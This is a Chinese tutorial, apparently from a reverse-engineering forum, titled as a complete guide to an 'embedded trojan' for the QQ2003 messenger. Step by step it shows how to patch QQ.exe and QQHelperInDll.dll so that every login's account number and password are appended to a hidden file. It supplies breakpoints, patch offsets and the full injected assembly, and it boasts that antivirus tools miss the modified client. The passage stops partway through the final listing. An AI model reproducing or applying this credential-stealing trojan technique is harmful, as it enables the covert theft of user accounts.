

# QQ 另类木马全攻略

> 原文：[`www.pediy.com/kssd/pediy06/pediy6592.htm`](https://www.pediy.com/kssd/pediy06/pediy6592.htm)

嵌入式木马---QQ 另类木马全攻略  
        
  
作者： laoqian\[FCG\]  
  
       nbw\[NE365\]\[FCG\]\[BCG\]\[DFCG\]        [www.vxer.com](http://www.vxer.com)  
  
  
    谨以此文献给 FCG ： [`www.fcgchina.com/ctb`](http://www.fcgchina.com/ctb)    。在此感谢看雪论坛关心和支持我的朋友，感谢 Laoqian\[FCG\]大哥对我的支持和鼓励。一并感谢 NE365 的死党 ：）  
  
  
       木马的作用和危害自不必多说。当前流行的木马，基本都是一个单独的程序，该程序运行在系统中，除了监测用户特定操作，其他和一般程序没什么区别。我这里说的所谓的“嵌入式木马”，并不是一个单独的程序，该“木马”像病毒一样嵌入目标软件，每当该软件被启动，木马程序也就被激活。这种做法好处很明显：1、占用系统资源极少；2、速度快，效率高；3、难以被查杀。  
    这里用 QQ 举例，修改 QQ 程序，让 QQ 读取用户账号和密码。  
    需要声明的有以下几点：  
    1、读取的账号和密码是即将被 QQ 处理的数据，因此，不管用户输入密码的时候，采用复制或者软键盘，都不会被幸免；  
    2、不会被木马克星之类的软件查杀。由于市面上 QQ 修改版很多，估计短期内也不会被各种杀毒软件查杀；  
    3、我们不对该文章产生的任何后果负责。  
    4、由于版本问题，如您照此进行试验而未果，我想是很正常的。  
  
  
盗取 QQ2003 密码和号码  
作者：nbw      [www.vxer.com](http://www.vxer.com)  
  
一、查找密码和号码的存放位置  
保存号码处:  
如果输入号码位数小于 5 便弹出提示.所以 bpx messageboxa.停留在一处,在此处 F12,回到外面一层,向上查找,到:  
:\* Reference To: QQHelperInDll.?CheckQQUinValid@@YAHVCString@@@Z, Ord:0016h  
                                  |  
:00414D76 FF15BC925300            Call dword ptr \[005392BC\]  
:00414D7C 3BC3                    cmp eax, ebx  
:00414D7E 59                      pop ecx  
:00414D7F 74D0                    je 00414D51    ;如果小于 5 便不跳  
  
上面的 call 追进去,其领空为:QQHelperInDll.dll .进去查看:  
:1000A260 8B4508                  mov eax, dword ptr \[ebp+08\]    ;\[ebp+08\]--->用户 QQ 号码  
:1000A263 8B40F8                  mov eax, dword ptr \[eax\-08\]    ;\[eax\-08\]--->QQ 号码的长度    
:1000A266 83F805                  cmp eax, 00000005      ;判断号码长度是否大于 5    
:1000A269 7D05                    jge 1000A270  
  
  
保存密码处:  
    找到了号码存放位置以后,填写号码和密码点下一步(最好填 5 位以下的密码,这样就不用进入下一个界面).在上面的  
mov eax, dword ptr \[ebp+08\]处拦截下来.下命令 d eax,看到自己的号码.向上不远便是自己输入的密码.这个存放密码  
的位置是变化的.比如说是在 016F:0098EC1C 处.下命令 bpm 016F:0098EC1C w .回到 QQ,再次输入一个密码,被拦截,可以  
pmodule 回到 QQ 领空,然后再次 F12,跳出来.可以找到关键的 call 是: :0041370D  Call 004FE0A2  这是一个 MFC 类库中的  
函数.有兴趣可以进去看一看,很简单.我就不说了.总之这个函数的返回值是:eax\-->密码长度,ecx\-->密码存放位置.嘿嘿,  
现在密码和号码全都有了.想干什么该我们说了算了.  
    我这里不能上网:(.. ,也没有 QQ 登录的纪录.如果有以前的登录纪录,就可以找到密码验证的地方,从而直接看出来密码和号码  
的位置,而不用象我这样还要处理 QQHelperInDll.dll .  
  
  
二、保存号码和密码  
    首先，处理密码的保存。因为密码显示区在 QQ 主文件领空.比较方便修改.  
  
查找剩余空间:  
用我写的"剩余空间查看器"分析,部分结果如下:  
    名称     RVA     OA        尺寸 D   可写否  
   .text  0013737e  0013737e   3202      否  
   .rdata  0018b756  0018b756   2218      否  
  
就说从文件偏移地址 0018b756 开始,有 2218 字节可用空间.但是.rdata 段为不可写,无法利用这里的空间声明变量.不过不要紧,用  
PEditor 把这个节区属性改成可写便可以了.事实证明,整个文件中只有.rdata 区段最后的剩余空间可以被正确加载,也只有这区区  
2218 字节供我们利用:(..  
  
  
三、修改文件,跳转到我们的代码区  
源文件为：  
:0041370D E890A90E00              Call 004FE0A2  
:00413712 8D8624040000            lea eax, dword ptr \[esi+00000424\]  
:00413718 50                      push eax  
:00413719 6844010000              push 00000144  
:0041371E 57                      push edi  
改为：  
:0041370D E890A90E00              Call 004FE0A2  
:00413712        jmp  18b78c    ;我们的代码将填写在 58b78c  
:00413717        nop  
:00413718 50                      push eax  
:00413719 6844010000              push 00000144  
:0041371E 57                      push edi  
中间减少了：  
:00413712 8D8624040000            lea eax, dword ptr \[esi+00000424\]  记录下来，以后补上  
  
四、需要用的函数调用地址  
CreateFileA    ：  538198  
SetFilePointer    ：  53819C  
WriteFile    ：  5381A0  
  
五、填写保存密码的代码  
  
  
改为:  
:0041370D E890A90E00              Call 004FE0A2  
:00413712        jmp  18b78c    ;我们的代码将填写在 537450  
:00413717        nop  
:00413718 50                      push eax  
:00413719 6844010000              push 00000144  
:0041371E 57                      push edi  
中间减少了：  
:00413712 8D8624040000            lea eax, dword ptr \[esi+00000424\]  记录下来，以后补上  
  
  
  
变量组织:  
  
18b760    :  "C:\\WINDOWS\\cnofig"----保存号码的文件地址.  
18b774    :  WriteFile 函数的一个参数.对我们来说没用.不过不可少  
18b780    :  文件句柄  18b784    :  密码地址  18b788    :  密码长度  
  
:0058b78c  test  eax,eax    ;有很多时候需要跳转到这里,如果不加区分就纪录,会导致很多资料被纪录.  
          如果 eax 是空,则不纪录.当然,这也或许是用户的密码本身就是空  
    jz  @F  
:0058b790  pushad      ;代码中多插几个 nop。防止以后修改代码的时候没有足够空间  
  
    add  ecx,eax    ;在密码最后面加一个#号用于区分  
    mov  byte \[ecx\],23  
    sub  ecx,eax  
    inc  eax  
  
    mov  \[0058b784\],ecx  ;密码地址  
    mov  \[0058b788\],eax  ;密码长度  
      
    push 00000000  
    push 00000002    ;FILE\_ATTRIBUTE\_HIDDEN,建立文件时使文件属性为隐藏  
    push 00000004    ;OPEN\_ALWAYS.如果不存在该文件,则建立之  
    push 00000000  
    push 00000003    ;允许其他进程使用文件(为了不发生意外,所以这样设置)  
    push C0000000  
    push 0058b760    ;pointer to name of the file   
  
\* Reference To: kernel32.CreateFileA, Ord:0030h  
          |  
    Call 538198  
    mov  \[0058b780\],eax  ;保存文件句柄  
    nop  
    nop  
    nop  
    nop  
    push 00000002    ;FILE\_END.设置文件末尾  
    push 00000000  
    push 00000000    ;设定文件指针为文件末尾  
    push eax  
  
\* Reference To: kernel32.SetFilePointer, Ord:0236h  
    |  
    Call 53819C  
    nop  
    nop  
    nop  
    push 00000000  
    push 0058b774  
    push \[0058b788\]    ;密码长度  
    push \[0058b784\]    ;密码地址  
    push \[0058b780\]    ;文件句柄  
  
\* Reference To: kernel32.WriteFile, Ord:029Eh  
                                  |  
    Call 005381A0  
  
    popad  
@@:    lea eax, dword ptr \[esi+00000424\]  
    jmp  00013718  
  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
六、填写保存 QQ 号码的代码  
    过程同上面差不多.只不过这里需要修改 QQHelperInDll.dll  
    文件中调用函数为：  
    :00414D76 FF15BC925300            Call dword ptr \[005392BC\]    ；调用 QQHelperInDll.dll 中的函数  
  
    1、查找剩余空间  
    分析如下：  
     .text  00014eb6  00014eb6    330      否  
     .rdata  0002cb14  0002cb14   1260      否  
     .data  0002ec94  0002ec94  -3220      可  
     .rsrc  0002f378  0002e378   3208      否  
     .reloc  00031b72  00030b72   1166      否  
    仍然把剩余空间定为.rdata 段最后，并把这个段修改为可写。但是这个段也无法全部加载，可用空间从 0002cb14 截止到 0002cbff  
  
    2、修改文件,跳转到我们的代码区  
    源文件：（注意文件偏移地址，比如:1000A260---->A260）  
  :1000A260 8B4508                  mov eax, dword ptr \[ebp+08\]    ;\[ebp+08\]--->用户 QQ 号码  
  :1000A263 8B40F8                  mov eax, dword ptr \[eax\-08\]    ;\[eax\-08\]--->QQ 号码的长度    
  :1000A266 83F805                  cmp eax, 00000005      ;判断号码长度是否大于 5    
  :1000A269 7D05                    jge 1000A270  
    修改为：  
  :1000A260        jmp  0002cb14  
  :1000A265        nop  
  :1000A266 83F805                  cmp eax, 00000005      ;判断号码长度是否大于 5    
  :1000A269 7D05                    jge 1000A270  
     少了 2 句：  
  mov eax, dword ptr \[ebp+08\]  
  mov eax, dword ptr \[eax\-08\]    ；记录下来，以后加上  
  
    3、填写保存密码的代码  
  变量组织：  
  58b760    :  "C:\\WINDOWS\\cnofig"----保存号码的文件地址.  
  58b774    :  WriteFile 函数的一个参数.对我们来说没用.不过不可少  
  58b780    :  文件句柄  58b784    :  密码地址  58b788    :密码长度  
:002cb14  pushad      ;代码中多插几个 nop。防止以后修改代码的时候没有足够空间  
  
                mov  eax, dword ptr \[ebp+08\]      
    mov  ecx,eax        ;ecx\--->用户 QQ 号码地址  
                mov  eax, dword ptr \[eax\-08\]    ;eax\--->QQ 号码的长度  
  
    add  ecx,eax        ;在密码最后面加一个$号用于区分  
    mov  byte \[ecx\],24  
    sub  ecx,eax  
    inc  eax  
  
    mov  \[0058b784\],ecx  ;密码地址  
    mov  \[0058b788\],eax  ;密码长度  
      
    push 00000000  
    push 00000002    ;FILE\_ATTRIBUTE\_HIDDEN,建立文件时使文件属性为隐藏  
    push 00000004    ;OPEN\_ALWAYS.如果不存在该文件,则建立之  
    push 00000000  
    push 00000003    ;允许其他进程使用文件(为了不发生意外,所以这样设置)  
    push C0000000  
    push 0058b760    ;pointer to name of the file   
  
\* Reference To: kernel32.CreateFileA, Ord:0030h  
          |  
    Call 538198  
    mov  \[0058b780\],eax  ;保存文件句柄  
    nop  
    nop  
    nop  
    nop  
    push 00000002    ;FILE\_END.设置文件末尾  
    push 00000000  
    push 00000000    ;设定文件指针为文件末尾  
    push eax  
  
\* Reference To: kernel32.SetFilePointer, Ord:0236h  
    |  
    Call 53819C  
    nop  
    nop  
    nop  
    push 00000000  
    push 0058b774    ;5ECBe4  
    push \[0058b788\]    ;密码长度  
    push \[0058b784\]    ;密码地址  
    push \[0058b780\]    ;文件句柄  
  
\* Reference To: kernel32.WriteFile, Ord:029Eh  
                                  |  
    Call 005381A0  
  
    popad  
    mov eax, dword ptr \[ebp+08\]  
    mov eax, dword ptr \[eax\-08\]  
    jmp  000A266  
  
  运行的时候发现，每次向号码框中输入一个数字，QQ 便会调用这个函数。所以就是说每向号码框中输入一位数字，便会  
产生一次写文件操作。随便跟踪一下，发现调用这个函数的地方在：413f0c 。SO，把：413f0c 处的 call 去掉便可以了。  
      
  
  
<自动保存 QQ2003III 木子版 1.4 的号码和密码到指定文件>  
  
软件名称： 腾讯 QQ2003 III 木子版 1.4  
软件大小： 1,765,376 字节   
应用平台： Win2000，winxp，win98SE  
软件类别： QQ   
发布主页： [`www.\*\*\*\*.com`](http://www.****.com)   
软件介绍： 不用说   
破解工具： ollydbg 1.10（Fly 修改版） ，W32DASM10，UltraEdit10.0，c32asm ，剩余空间查看器，PEditor  
破解目的： 自动保存 QQ 木子版 1.4 的号码和密码到指定文件   
破解过程：  
  一、查找密码和号码的存放位置----准备工作  
    
  无壳，直接用 W32DASM 反汇编，先查找可疑字符串、调用函数等。再用 ollydbg 1.10 调试，断点就好设了。   
   
先找保存号码处:  
   
 我们知道如果输入号码位数小于 5 便弹出提示，那我们在这里设断，同时用 W32DASM 反汇编，查找到可疑调用：QQHelperInDll.?CheckQQUinValid@@YAHVCString@@@Z, Ord:0016h  
   
ollydbg 1.10 打开 QQ.exe,所以 bpd messageboxa.  
然后找到 QQHelperInDll.?CheckQQUinValid 所在的 messageboxa 下断，F9 运行，F8 查找到:  
   
00414F19    .  FF15 C8A25300      call dword ptr ds:\[<&QQHelperInDll.Che>;  QQHelper.CheckQQUinValid  
00414F1F    .  3BC3               cmp eax,ebx  
00414F21    .  59                 pop ecx    ;--->可以看到 ecx=用户 QQ 号码  
00414F22    .^ 74 D0              je short QQmz14.00414EF4 ；如果小于 5 便不跳  
00414F24    .  8D4D D8            lea ecx,dword ptr ss:\[ebp\-28\]  
00414F27    .  E8 20A40E00        call <jmp.&MFC42.#540>  
   
上面的 00414F19：call 追进去,其领空为:QQHelperInDll.dll .进去查看，走到:  
   
0023AEAA     59                   pop ecx         ; USER32.SendMessageA  
0023AEAB     8B45 08              mov eax,dword ptr ss:\[ebp+8\]  ;\[ebp+08\]--->用户 QQ 号码  
0023AEAE     8B40 F8              mov eax,dword ptr ds:\[eax\-8\]  ;\[eax\-08\]--->QQ 号码的长度      
0023AEB1     83F8 05              cmp eax,5      ;判断号码长度是否大于 5   
0023AEB4     7D 05                jge short QQHelper.0023AEBB  
0023AEB6     6A 02                push 2  
   
返回 QQ.exe 领空继续走，有些累，暂时先换个思路，以下这是 nbw 提供的方法，只是他用 TRW 而已。  
   
保存密码处:  
   
    找到了号码存放位置以后,填写号码和密码点下一步(最好填 5 位以下的密码,这样就不用进入下一个界面).在上面的 mov eax, dword ptr \[ebp+08\]处设断拦截下来.下命令 d eax,看到自己的号码.向上或向下不远便是自己输入的密码.这个存放密码的位置每次打开 QQ 运行是变化的，但只要调试时不关闭重启 QQ 他是固定的。比如说是在 0012EC1C 处，右键“转存跟随”，然后下内存访问断点.回到 QQ,再次输入一个密码,被拦截,然后 F8 走，这时注意 ecx，eax 的值.可以找到关键的 call 是: 004138B0 Call 004FF4FC ，F8 走过这个 call 这时 ecx=QQ 密码,eax\=密码长度。 这是一个 MFC 类库中的函数.有兴趣可以进去看一看,很简单.我就不说了.总之这个函数的返回值是:eax\-->密码长度,ecx\-->密码存放位置。  
      
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
显示 QQ 登陆密码 ecx\=QQ 密码,eax\=密码长度  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\* Reference To: MFC42.Ordinal:08FD, Ord:08FDh  
                                  |  
:0041389D E854BC0E00              Call 004FF4F6  
:004138A2 8D8620040000            lea eax, dword ptr \[esi+00000420\]  
:004138A8 BBB4000000              mov ebx, 000000B4  
:004138AD 50                      push eax  
:004138AE 53                      push ebx  
:004138AF 57                      push edi  
   
\* Reference To: MFC42.Ordinal:0942, Ord:0942h  
                                  |  
:004138B0 E847BC0E00              Call 004FF4FC   ;关键 call \[1\]，ecx=QQ 密码,eax\=密码长度  
:004138B5 8D8624040000            lea eax, dword ptr \[esi+00000424\] ;我们就改这里了！！！  
:004138BB 50                      push eax  
:004138BC 6844010000              push 00000144  
:004138C1 57                      push edi  
   
\* Reference To: MFC42.Ordinal:08FD, Ord:08FDh  
                                  |  
:004138C2 E82FBC0E00              Call 004FF4F6  
......  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
   
    到此号码和密码都有了，但是号码是出现在 QQHelperInDll.dll 里，由于 nbw 不能上网  .. ,也没有 QQ 登录的纪录.如果有以前的登录纪录,就可以找到密码验证的地方,从而直接看出来密码和号码的位置,而不用这样还要处理 QQHelperInDll.dll。  
    我可以上网，那我接下来找一个在 QQ.exe 里 QQ 号码存放地址。  
      
我们在关键 call \[1\]那里设个断点，并暂时关闭其他断点，输入 QQ 号码和密码，重新运行：      
004138B0 E847BC0E00    Call 004FF4FC   ;我们设断点在这里  
   
    中断后，F8 一步一步走，这时注意 ecx，eax 的值，直到看到 ecx=QQ 号码,eax\=号码长度，期间要反复回到 004138B0 Call 004FF4FC 这个 call 三四次，最后我们发现这个关键 call \[2\]：:00414B2F Call 004FF62E。  
      
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
显示 QQ 号码 登陆，这里 ecx=QQ 号码,eax\=号码长度  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\* Reference To: MFC42.Ordinal:0C14, Ord:0C14h  
                                  |  
:00414B28 E817AA0E00              Call 004FF544  
:00414B2D 8BC8                    mov ecx, eax  
   
\* Reference To: MFC42.Ordinal:0F22, Ord:0F22h  
                                  |  
:00414B2F E8FAAA0E00              Call 004FF62E  ;关键 call \[2\]，ecx=QQ 号码,eax\=号码长度  
:00414B34 33DB                    xor ebx, ebx   ;我们就改这里了！！！  
:00414B36 395E68                  cmp dword ptr \[esi+68\], ebx  
:00414B39 7403                    je 00414B3E  
:00414B3B 895E6C                  mov dword ptr \[esi+6C\], ebx  
   
\* Referenced by a (U)nconditional or (C)onditional Jump at Address:  
|:00414B39(C)  
|  
:00414B3E 8D4DE8                  lea ecx, dword ptr \[ebp\-18\]  
   
\* Reference To: MFC42.Ordinal:021C, Ord:021Ch  
                                  |  
:00414B41 E806A80E00              Call 004FF34C  
:00414B46 8D4DEC                  lea ecx, dword ptr \[ebp\-14\]  
   
  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
接着往下走就会到这里，也显示 ecx=QQ 号码或 email 登陆,但是没有长度  
我们改下面也行，不过麻烦一些。  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
显示 QQ 号码 登陆  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\* Reference To: QQHelperInDll.?CheckQQUinValid@@YAHVCString@@@Z, Ord:0016h  ；看到明显的提示 CheckUinValid  
                                  |  
:00414571 FF15C8A25300            Call dword ptr \[0053A2C8\]  
   
\* Referenced by a (U)nconditional or (C)onditional Jump at Address:  
|:0041434E(U)  
|  
:00414577 3BC3                    cmp eax, ebx  
:00414579 59                      pop ecx  
:0041457A 0F8507030000            jne 00414887  
   
\* Referenced by a (U)nconditional or (C)onditional Jump at Address:  
|:0041455C(U)  
|  
:00414580 807E6401                cmp byte ptr \[esi+64\], 01  
:00414584 7505                    jne 0041458B  
:00414586 8B45E4                  mov eax, dword ptr \[ebp\-1C\]  
:00414589 EB12                    jmp 0041459D  
   
\* Referenced by a (U)nconditional or (C)onditional Jump at Address:  
|:00414584(C)  
|  
:0041458B FF767C                  push \[esi+7C\]   ；ecx=QQ 号码,没有长度  
:0041458E 6AFF                    push FFFFFFFF  
:00414590 684C010000              push 0000014C  
:00414595 FFB6B0000000            push dword ptr \[esi+000000B0\]  
:0041459B FFD7                    call edi  
   
\* Referenced by a (U)nconditional or (C)onditional Jump at Address:  
|:00414589(U)  
|  
:0041459D 83F8FF                  cmp eax, FFFFFFFF  
:004145A0 8945E8                  mov dword ptr \[ebp\-18\], eax  
:004145A3 0F84DE020000            je 00414887  
:004145A9 53                      push ebx  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
显示 QQ 号码 email 登陆  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\* Referenced by a (U)nconditional or (C)onditional Jump at Address:  
|:00414EF8(C)  
|  
:00414F82 FF767C                  push \[esi+7C\]          ；ecx=email,没有长度  
:00414F85 6AFF                    push FFFFFFFF  
:00414F87 684C010000              push 0000014C  
:00414F8C FFB6B0000000            push dword ptr \[esi+000000B0\]  
:00414F92 FFD7                    call edi  
.............  
\*\*\*\*\*\*\*\*\*\*  
\*\*  
\* Referenced by a (U)nconditional or (C)onditional Jump at Addresses:  
|:00414BEA(C), :00414F22(C)  
|  
:00414EF4 807E6401                cmp byte ptr \[esi+64\], 01  
:00414EF8 0F8584000000            jne 00414F82              ；跳到 00414F82  
:00414EFE 8B45DC                  mov eax, dword ptr \[ebp\-24\]  
:00414F01 E98E000000              jmp 00414F94  
   
\* Referenced by a (U)nconditional or (C)onditional Jump at Address:  
|:00414BBA(C)  
|  
:00414F06 51                      push ecx  
:00414F07 8D467C                  lea eax, dword ptr \[esi+7C\]  
:00414F0A 8BCC                    mov ecx, esp  
:00414F0C 8965D4                  mov dword ptr \[ebp\-2C\], esp  
:00414F0F 50                      push eax  
   
\* Reference To: MFC42.Ordinal:0217, Ord:0217h  
                                  |  
:00414F10 E8F9A50E00              Call 004FF50E  
:00414F15 C645FC02                mov \[ebp\-04\], 02  
   
\* Reference To: QQHelperInDll.?CheckQQUinValid@@YAHVCString@@@Z, Ord:0016h  ；看到明显的提示 CheckUinValid  
                                  |  
:00414F19 FF15C8A25300            Call dword ptr \[0053A2C8\]  
:00414F1F 3BC3                    cmp eax, ebx  
:00414F21 59                      pop ecx  
:00414F22 74D0                    je 00414EF4  
:00414F24 8D4DD8                  lea ecx, dword ptr \[ebp\-28\]  
..........  
........  
\*\*\*\*\*  
\* Reference To: QQHelperInDll.?CheckEmailValid@@YAHVCString@@@Z, Ord:0012h ；看到明显的提示 CheckEmailValid  
                                  |  
:00414BE1 FF1568A25300            Call dword ptr \[0053A268\]  
:00414BE7 3BC3                    cmp eax, ebx  
:00414BE9 59                      pop ecx  
:00414BEA 0F8404030000            je 00414EF4        ；跳到 00414EF4  
:00414BF0 8D4DE0                  lea ecx, dword ptr \[ebp\-20\]  
   
\* Reference To: MFC42.Ordinal:021C, Ord:021Ch  
                                  |  
:00414BF3 E854A70E00              Call 004FF34C  
.............  
省略  
............  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
   分析一下就明白，这是 QQ 的 3 种登陆方式，QQ 号，email，还有手机，我们就用最前面我们找到的那个 CAll，3 种方式都在那里开始。  
\*\*\*\*分析到此，  
嘿嘿,现在密码和号码全都有了.想干什么该我们说了算了----这是 nbw 的原话！  
   
二、保存号码和密码到文件----diy 开始！  
   
    因为号码、密码显示区都在 QQ 主文件领空找到，这就比较方便修改了。  
   
 1.查找剩余空间:  
 推荐：  
  剩余空间查看器：[`nboy.cnwlt.com`](http://nboy.cnwlt.com)  
    作者:牛博威  
   Email:   advice107@sina.com  
 用牛博威写的"剩余空间查看器"分析,部分结果如下:  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
2004 年 5 月 25 日，发布木子 1.4 版本 QQ.exe  
    名称     RVA     OA        尺寸 D   可写否  
   .text  00138e0e  00138e0e    498      否  
  .rdata  0018cd26  0018cd26    730      否  
   .data  001ac2c4  001ac2c4  -12996     可  
   .rsrc  001b2dc8  001aedc8    568      否  
有效剩余空间(字节 D)为: 1796  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
    我们用.rdata 段，就说从文件偏移地址 0018cd26 开始,有 730 字节可用空间。但是.rdata 段为不可写,无法利用这里的空间声明变量。不过不要紧,用 PEditor 把这个节区属性改成可写便可以了（方法不罗嗦了，简单）。事实证明，整个文件中.rdata 区段最后的剩余空间可以被正确加载，这区区 730 字节供我们利用  ..足够了！  
   
2.准备工作----这是 nbw 提供的精髓所在！！！  
   
变量组织:我们需要用的变量就设在.rdata 段 0018cd26 后面  
18cd60 :    "C:WINDOWScfg.txt"----保存号码的文件地址.我们指定在 C:WINDOWS 里，也可以其他，随便了，不过不要太长！  
18cd74 :    WriteFile 函数的一个参数，数据缓冲区。对我们来说没用。不过不可少！  
18cd80 :    文件句柄      
18cd84 :    密码（或号码）地址  
18cd88 :    密码（或号码）长度  
18CD5A ：   标记: \[58CD5A\] =00  ;获取密码  
                  \[58CD5A\] =01  ;不获取密码  
   
需要用的函数调用地址，很幸运，我们可以在 QQ 主文件找到：  
   
\* Reference To: KERNEL32.CreateFileA, Ord:0034h    
:00401F4D FF159C915300  Call dword ptr \[0053919C\]  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\* Reference To: KERNEL32.SetFilePointer, Ord:026Ah    
:0040189A FF15A0915300  Call dword ptr \[005391A0\]  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\*\* Reference To: KERNEL32.WriteFile, Ord:02DFh         
:004018E5 8B3DA4915300  mov edi, dword ptr \[005391A4\]  
:004018EB FFD7          call edi  
我们可以转换成：  
:004018E5  FF15A4915300 Call dword ptr \[005391A4\]  
   
2.修改文件,跳转到我们的代码区  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
一.显示 QQ 登陆密码   
这时的 ecx=QQ 密码,eax\=密码长度  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
源文件为：  
\* Reference To: MFC42.Ordinal:0942, Ord:0942h                      |  
:004138B0 E847BC0E00    Call 004FF4FC   ;ecx\=QQ 密码,eax\=密码长度  
:004138B5 8D8624040000  lea eax, dword ptr \[esi+00000424\] ;我们就改这里了！！！  
:004138BB 50            push eax  
:004138BC 6844010000    push 00000144  
:004138C1 57            push edi  
改为：  
:004138B0 E847BC0E00    Call 004FF4FC   ;ecx\=QQ 密码,eax\=密码长度  
:004138B5 E9D2941700    jmp 0058CD8C    ;跳到我们的代码将填写在 58cd8c，offset 为 18cd8c  
:004138BA 90            nop  
:004138BB 50            push eax  
:004138BC 6844010000    push 00000144  
:004138C1 57            push edi  
\*\*\*   中间少了下面，我们在后面补上：  
:004138B5 8D8624040000  lea eax, dword ptr \[esi+00000424\]   
\*\*\*\*\*\*\*\*   
:004138B5 跳到我们的代码，我们在.rdata 段 0018CD8C 开始我们的工作：  
   
0058CD8C  60             pushad       ；所有的寄存器依次入栈  
0058CD8D  85C0           test eax,eax ；前面分析有很多时候需要跳转到这里,  
   ；如果不加区分就纪录,会导致很多资料被纪录.  
   ；如果 eax 是 0，则不纪录，当然,这也或许是用户的密码本身就是空  
   ；这是第一步判断是否需要记录。  
0058CD8F  74 76          je 0058CE07 ；如果 eax 是 0，则不纪录.  
0058CD91  8B15 5ACD5800  mov edx,dword ptr ds:\[58CD5A\]；获取密码标记:初始值\[58CD5A\]=00  
0058CD97  83FA 01        cmp edx,1  ；这是第一步判断是否需要记录，nbw 提供的精髓。  
0058CD9A  74 6B          je 0058CE07 ；已经记录了则\[58CD5A\]=1，就跳走。  
\*\*\*\*\*\*\*\*\*  
这之间的是给密码前后加上分隔符，用于区分不同号码的密码。  
0058CD9C  49             dec ecx          ；ecx 地址前移一位  
0058CD9D  C601 22        mov byte ptr ds:\[ecx\],22 ；ecx 地址前移一位写下 22 为双引号”  
0058CDA0  40             inc eax         ；eax=eax+1  
0058CDA1  C60408 2D      mov byte ptr ds:\[eax+ecx\],2D  ；ecx 地址最后一位的下一位写下 2D 为“-”  
0058CDA5  40             inc eax  ；eax 再加 1，这时 eax=原密码长度+2.  
0058CDA6  890D 84CD5800  mov dword ptr ds:\[58CD84\],ecx  ；ecx 这时为 QQ 密码前后加了分隔符的字符串  
0058CDAC  A3 88CD5800    mov dword ptr ds:\[58CD88\],eax  ；eax 这时为 QQ 密码前后加了 2 个分隔符后的长度  
\*\*\*\*\*\*\*\*\*  
0058CDB1  6A 00          push 0  
0058CDB3  6A 02          push 2  ;FILE\_ATTRIBUTE\_HIDDEN,建立文件时使文件属性为隐藏  
0058CDB5  6A 04          push 4  ;OPEN\_ALWAYS.如果不存在该文件,则建立之  
0058CDB7  6A 00          push 0  
0058CDB9  6A 03          push 3  ;允许其他进程使用文件(为了不发生意外,所以这样设置)  
0058CDBB  68 000000C0    push C0000000  
0058CDC0  68 60CD5800    push 0058CD60   ; ASCII "C:WINDOWSCFG.TXT" ;指向我们存盘文件   
0058CDC5  FF15 9C915300  Call dword ptr \[0053919C\]; KERNEL32.CreateFileA  
0058CDCB  A3 80CD5800    mov dword ptr ds:\[58CD80\],eax  ;保存文件句柄留给 WriteFile 用  
0058CDD0  6A 02          push 2   ;FILE\_END.设置文件末尾  
0058CDD2  6A 00          push 0  
0058CDD4  6A 00          push 0   ;设定文件指针为文件末尾  
0058CDD6  50             push eax  
0058CDD7  FF15 A0915300  Call dword ptr \[005391A0\]  ; KERNEL32.SetFilePointer  
0058CDDD  90             nop  
0058CDDE  6A 00          push 0  
0058CDE0  68 74CD5800    push 0058CD74   ；WriteFile 函数的一个参数，对我们来说没用，不过不可少！  
0058CDE5  FF35 88CD5800  push dword ptr ds:\[58CD88\]  ;加了 2 个分隔符的密码长度  
0058CDEB  FF35 84CD5800  push dword ptr ds:\[58CD84\]  ;加了 2 个分隔符的密码地址  
